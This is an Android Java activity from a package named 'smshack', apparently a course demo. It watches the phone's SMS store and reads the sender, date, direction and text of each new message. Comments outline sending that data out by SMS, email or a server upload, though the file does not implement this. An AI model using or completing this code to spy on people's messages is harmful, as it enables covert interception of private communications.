package com.itheima.smshack;

import java.util.Date;

import android.app.Activity;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;

public class MainActivity extends Activity {
	private Uri uri = Uri.parse("content://sms");	// 手机短信内容提供者的Uri

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		
		// 注册ContentObserver
		getContentResolver().registerContentObserver(uri , true, new ContentObserver(new Handler()) {
			private Date date;
			public void onChange(boolean selfChange) {		// 收发短信时查询出最后一条数据
				Cursor c = getContentResolver().query(uri, new String[] { "address", "date", "type", "body" }, null, null, "_id DESC LIMIT 1");
				if (c.moveToNext()) {
					String address = c.getString(0);
					Date newDate = new Date(c.getLong(1));
					if (newDate.equals(date))
						return;
					date = newDate;
					String type = c.getInt(2) == 1 ? "收" : "发";
					String body = c.getString(3);
					
					System.out.println(address + ", " + newDate + ", " + type + ", " + body);
					// 通过短信发送到自己的手机
					// 发送邮件
					// 提交到服务器
				}
			}
		});
	}

}
